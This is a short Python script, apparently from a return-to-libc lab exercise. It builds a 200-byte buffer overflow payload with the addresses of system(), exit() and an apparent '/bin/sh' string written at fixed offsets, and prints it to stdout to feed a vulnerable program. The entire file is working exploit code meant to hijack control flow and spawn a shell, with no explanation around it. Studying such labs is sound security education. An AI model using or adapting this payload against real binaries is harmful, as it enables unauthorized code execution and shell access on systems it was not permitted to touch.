#!/usr/bin/env python3
import sys 

content = bytearray(0xaa for i in range(200))

X = 52     
sh_addr = 0xffffe103
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

Y = 44     
system_addr = 0xf7dcecd0
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')

Z = 48     
exit_addr = 0xf7dc11f0
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

sys.stdout.buffer.write(content)